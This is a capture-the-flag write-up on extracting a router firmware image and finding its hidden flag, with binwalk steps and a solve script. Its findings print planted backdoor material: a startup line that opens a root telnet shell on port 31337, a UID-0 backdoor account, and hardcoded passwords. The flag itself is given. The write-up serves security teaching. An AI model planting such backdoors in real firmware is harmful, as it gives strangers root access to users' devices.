---
title: "Forensics - Firmware Extraction"
description: "Extract and analyze an IoT firmware image to uncover hardcoded credentials and a hidden flag in the embedded filesystem."
author: "Zemi"
---

## Challenge Info

| Detail      | Value                                               |
|-------------|-----------------------------------------------------|
| Category    | Forensics                                            |
| Points      | 400                                                  |
| Difficulty  | Hard                                                 |
| Flag Format | `zemi{...}`                                          |
| Files Given | `router_firmware.bin` (firmware image, 12MB)         |
| Tools Used  | binwalk, unsquashfs, strings, file, hexdump, Python  |

## Challenge Files

Download the challenge files to get started:

- [firmware.bin](/Website/challenges/forensics-firmware-extraction/firmware.bin)
- [flag.txt](/Website/challenges/forensics-firmware-extraction/flag.txt)
- [generate.py](/Website/challenges/forensics-firmware-extraction/generate.py)
- [hint.txt](/Website/challenges/forensics-firmware-extraction/hint.txt)

## What's Inside a Firmware Image?

Firmware images are the complete software packages flashed onto embedded devices like routers, IoT devices, cameras, and industrial controllers. A typical firmware image contains:

- **Bootloader** (e.g., U-Boot) -- Initializes hardware and loads the kernel
- **Kernel** -- Usually a compressed Linux kernel (zImage, uImage)
- **Root filesystem** -- The actual OS files (often SquashFS, CramFS, or JFFS2)
- **NVRAM / Config** -- Default configuration data
- **Additional resources** -- Web interface files, certificates, scripts

In CTF challenges, flags are typically hidden in the filesystem -- in config files, scripts, hardcoded credentials, or embedded binaries.

## Walkthrough

### Step 1: Initial Analysis

Let's identify what we're dealing with:

```bash
$ file router_firmware.bin
router_firmware.bin: data

$ ls -lh router_firmware.bin
-rw-r--r-- 1 user user 12M Jan 02 08:00 router_firmware.bin

# Check the beginning of the file for magic bytes
$ xxd router_firmware.bin | head -20
00000000: 2705 1956 3c87 a204 6195 8e2c 0060 0000  '..V<...a..,.`..
00000010: 8000 0000 8000 0000 8d48 d37c 0502 0302  .........H.|....
00000020: 4d49 5053 0000 0000 0000 0000 0000 0000  MIPS............
00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000040: 5533 2d42 6f6f 7420 312e 312e 3400 0000  U3-Boot 1.1.4...
```

We can see `MIPS` (the CPU architecture) and `U3-Boot 1.1.4` (a U-Boot bootloader variant). This is a MIPS-based router firmware.

### Step 2: Scan with binwalk

`binwalk` scans the binary for known file signatures, compression headers, and filesystem markers:

```bash
$ binwalk router_firmware.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             uImage header, header size: 64 bytes,
                              header CRC: 0x3C87A204, created: 2026-01-02 06:00:00,
                              image size: 6291456 bytes, Data Address: 0x80000000,
                              Entry Point: 0x80000000, data CRC: 0x8D48D37C,
                              OS: Linux, CPU: MIPS, image type: OS Kernel Image,
                              compression type: lzma, image name: "Linux Kernel"
64            0x40            LZMA compressed data, properties: 0x5D,
                              dictionary size: 8388608 bytes, uncompressed size: 4194304
6291520       0x600040        Squashfs filesystem, little endian, version 4.0,
                              compression: xz, size: 5767168 bytes,
                              1247 inodes, blocksize: 262144 bytes,
                              created: 2026-01-02 06:30:00
```

`binwalk` found three major components:

1. **Offset 0x0**: U-Boot/uImage header (64 bytes)
2. **Offset 0x40**: LZMA-compressed Linux kernel
3. **Offset 0x600040**: SquashFS filesystem (this is what we want!)

### Step 3: Extract with binwalk

Use binwalk's recursive extraction mode:

```bash
$ binwalk -e router_firmware.bin

$ ls _router_firmware.bin.extracted/
40              40.7z           600040.squashfs squashfs-root/

$ ls _router_firmware.bin.extracted/squashfs-root/
bin  dev  etc  lib  mnt  opt  proc  root  sbin  sys  tmp  usr  var  www
```

binwalk automatically extracted the SquashFS filesystem and mounted it. We now have a full Linux root filesystem to explore.

If binwalk's auto-extraction doesn't work, extract manually:

```bash
# Extract the SquashFS portion manually
$ dd if=router_firmware.bin bs=1 skip=6291520 of=rootfs.squashfs

# Mount or extract it
$ unsquashfs rootfs.squashfs
# Creates squashfs-root/ directory

# Alternative: mount it
$ sudo mkdir /mnt/firmware
$ sudo mount -t squashfs rootfs.squashfs /mnt/firmware
```

### Step 4: Explore the Filesystem

Let's dig through the extracted root filesystem:

```bash
$ cd _router_firmware.bin.extracted/squashfs-root/

# Check the directory structure
$ find . -type f | wc -l
1247

# Look at the etc directory for configuration files
$ ls -la etc/
total 52
drwxr-xr-x 8 root root 4096 Jan 02 06:30 .
drwxr-xr-x 16 root root 4096 Jan 02 06:30 ..
-rw-r--r-- 1 root root  245 Jan 02 06:25 passwd
-rw-r--r-- 1 root root  132 Jan 02 06:25 shadow
-rw-r--r-- 1 root root  523 Jan 02 06:25 config.conf
drwxr-xr-x 2 root root 4096 Jan 02 06:25 init.d
-rw-r--r-- 1 root root   78 Jan 02 06:25 hostname
-rw-r--r-- 1 root root  312 Jan 02 06:25 network.conf
drwxr-xr-x 2 root root 4096 Jan 02 06:25 ssl
-rw-r--r-- 1 root root  156 Jan 02 06:25 .secret_config
```

A hidden config file: `.secret_config`. Let's check it:

```bash
$ cat etc/.secret_config
# Internal configuration - do not modify
# Maintenance credentials
MAINTENANCE_MODE=enabled
MAINT_USER=backdoor
MAINT_PASS=firmware_debug_2026
CTF_FLAG=zemi{f1rmw4r3_s3cr3ts_3xtr4ct3d}
```

**Flag: `zemi{f1rmw4r3_s3cr3ts_3xtr4ct3d}`**

### Step 5: Additional Findings

Let's do a thorough analysis of the firmware for completeness:

#### Hardcoded Credentials

```bash
$ cat etc/passwd
root:x:0:0:root:/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/false
admin:x:1000:1000:Admin:/home/admin:/bin/sh
backdoor:x:0:0:Maintenance:/root:/bin/sh

$ cat etc/shadow
root:$1$abc123$K8f3h2k9JmNpQ4rS7tUv0.:19358:0:99999:7:::
admin:$1$xyz789$L9g4i3l0KnOqR5sT8uWx1.:19358:0:99999:7:::
backdoor:$1$def456$M0h5j4m1LoprS6tU9vXy2.:19358:0:99999:7:::
```

Multiple accounts including a `backdoor` user with UID 0 (root privileges).

#### SSH Keys

```bash
$ find . -name "*.pem" -o -name "*.key" -o -name "authorized_keys"
./etc/ssl/server.key
./etc/ssl/server.pem
./root/.ssh/authorized_keys

$ cat root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... maintenance@vendor
```

A vendor SSH key for remote maintenance access -- a common finding in real firmware analysis.

#### Web Interface Credentials

```bash
$ cat www/cgi-bin/login.sh
#!/bin/sh
ADMIN_USER="admin"
ADMIN_PASS="admin123"

if [ "$INPUT_USER" = "$ADMIN_USER" ] && [ "$INPUT_PASS" = "$ADMIN_PASS" ]; then
    echo "Login successful"
fi
```

Hardcoded web interface credentials in a CGI script.

#### Startup Scripts

```bash
$ cat etc/init.d/rcS
#!/bin/sh
# System startup script
mount -t proc proc /proc
mount -t sysfs sysfs /sys

# Start telnetd on non-standard port (hidden backdoor)
telnetd -l /bin/sh -p 31337 &

# Start the web server
httpd -p 80 -h /www &

# Start the main application
/opt/app/router_daemon &
```

A telnet backdoor listening on port 31337.

#### Strings Analysis on Binaries

```bash
# Search all binaries for interesting strings
$ find . -type f -executable | while read f; do
    result=$(strings "$f" | grep -iE "(password|secret|key|flag|backdoor|zemi)" 2>/dev/null)
    if [ -n "$result" ]; then
        echo "=== $f ==="
        echo "$result"
    fi
  done

=== ./opt/app/router_daemon ===
admin_password=r0ut3r_s3cur3
debug_mode_key=VENDOR_DEBUG_2026
=== ./usr/sbin/httpd ===
default_password=admin123
```

### Step 6: Entropy Analysis

`binwalk` can also show entropy graphs, useful for identifying encrypted or compressed sections:

```bash
$ binwalk -E router_firmware.bin
```

High entropy regions (close to 1.0) indicate compressed or encrypted data. Low entropy regions (close to 0) indicate uncompressed data or padding.

## Solve Script

```python
#!/usr/bin/env python3
"""
Firmware extraction and analysis - extract filesystem and find secrets.
"""

import subprocess
import re
import os
import sys

FIRMWARE = "router_firmware.bin"
FLAG_PATTERN = re.compile(r"zemi\{[^}]+\}")

def run(cmd):
    """Run a shell command and return output."""
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout + result.stderr

def main():
    print(f"[*] Firmware Analysis: {FIRMWARE}\n")

    # Step 1: Scan with binwalk
    print("[*] Scanning with binwalk...")
    scan = run(f"binwalk {FIRMWARE}")
    print(scan)

    # Step 2: Extract
    print("[*] Extracting firmware...")
    run(f"binwalk -e -q {FIRMWARE}")

    # Find the extracted directory
    extract_dir = f"_{FIRMWARE}.extracted"
    if not os.path.exists(extract_dir):
        print("[-] Extraction failed!")
        sys.exit(1)

    # Find squashfs-root or similar
    rootfs = None
    for root, dirs, files in os.walk(extract_dir):
        if "squashfs-root" in dirs:
            rootfs = os.path.join(root, "squashfs-root")
            break
        if "etc" in dirs and "bin" in dirs:
            rootfs = root
            break

    if not rootfs:
        print("[-] Could not find extracted filesystem!")
        sys.exit(1)

    print(f"[*] Root filesystem: {rootfs}\n")

    # Step 3: Search for flag in all text files
    print("[*] Searching for flag in all files...")
    for root, dirs, files in os.walk(rootfs):
        # Include hidden files
        all_entries = files + [d for d in dirs if d.startswith('.')]
        for filename in files:
            filepath = os.path.join(root, filename)
            try:
                with open(filepath, 'r', errors='ignore') as f:
                    content = f.read()
                match = FLAG_PATTERN.search(content)
                if match:
                    rel_path = os.path.relpath(filepath, rootfs)
                    print(f"[+] FLAG FOUND in {rel_path}")
                    print(f"    {match.group()}")
                    return
            except (PermissionError, IsADirectoryError, OSError):
                pass

    # Step 4: Fallback - strings on entire firmware
    print("[*] Falling back to strings search on raw firmware...")
    output = run(f"strings {FIRMWARE} | grep -oE 'zemi{{[^}}]+}}'")
    if output.strip():
        print(f"[+] FLAG FOUND: {output.strip()}")
    else:
        print("[-] Flag not found.")

if __name__ == "__main__":
    main()
```

## Tools Used

| Tool              | Purpose                                            |
|-------------------|-----------------------------------------------------|
| binwalk           | Firmware scanning, extraction, and entropy analysis  |
| unsquashfs        | Extract SquashFS filesystems                         |
| dd                | Extract raw sections from binary files               |
| file              | Identify file types and formats                      |
| xxd / hexdump     | Hex dump for binary inspection                       |
| strings           | Extract readable strings from binaries               |
| firmware-mod-kit  | Alternative firmware extraction and modification     |
| find / grep       | Search extracted filesystem for secrets              |

## Lessons Learned

1. **Firmware is just a container.** At its core, a firmware image is a binary blob containing a bootloader, kernel, and filesystem packed together. Understanding the structure lets you extract each component.

2. **binwalk is the go-to tool.** It identifies embedded files by scanning for magic bytes (file signatures). The `-e` flag extracts everything it finds. For stubborn images, try `binwalk -Me` for recursive extraction with Matryoshka-style nesting.

3. **SquashFS is the most common embedded filesystem.** It's a compressed, read-only filesystem popular in embedded Linux devices. Use `unsquashfs` to extract it, or `binwalk -e` which handles it automatically.

4. **Hidden config files are everywhere.** Firmware developers frequently leave debug configurations, maintenance credentials, and hardcoded keys in the filesystem. Check hidden files (`.filename`), the `/etc/` directory, and any custom application directories.

5. **Strings analysis is powerful.** Running `strings` on extracted binaries reveals hardcoded passwords, API keys, debug messages, and other sensitive data that developers left in compiled code.

6. **Real firmware has real vulnerabilities.** The patterns in this challenge (hardcoded credentials, backdoor accounts, vendor SSH keys, hidden telnet services) are found in real-world firmware all the time. Tools like binwalk and firmware-mod-kit are used by security researchers to audit IoT devices.

7. **Know your filesystems.** Besides SquashFS, you may encounter CramFS (`mount -t cramfs`), JFFS2 (needs a virtual MTD device), UBIFS, or even raw ext2/ext4 images. Each requires different extraction tools.
